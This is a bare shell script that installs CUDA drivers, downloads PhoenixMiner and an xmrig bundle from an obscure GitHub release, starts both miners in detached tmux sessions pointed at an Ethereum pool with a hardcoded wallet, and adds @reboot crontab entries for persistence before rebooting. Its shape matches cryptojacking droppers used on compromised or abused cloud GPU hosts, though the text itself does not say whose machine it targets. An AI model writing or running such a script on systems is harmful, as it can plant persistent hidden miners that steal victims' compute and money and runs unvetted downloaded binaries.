#!/bin/sh
cat <(crontab -l) <(echo "@reboot /root/start.sh") | crontab -
CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.2.89-1_amd64.deb
wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG} 
sudo dpkg -i /tmp/${CUDA_REPO_PKG}
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub 
rm -f /tmp/${CUDA_REPO_PKG}
sudo apt-get update
sudo apt-get install cuda-drivers -y
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
tar xzf PhoenixMiner_5.6d_Linux.tar.gz
echo '#!/bin/sh'>>start.sh
echo "cd /root">>start.sh
echo "tmux kill-server">>start.sh
echo "sleep 1">>start.sh
echo "sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x'">>start.sh
echo "sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'">>start.sh
echo "@reboot  sh /root/start.sh">> resmi
crontab resmi
sudo rm resmi
sudo reboot
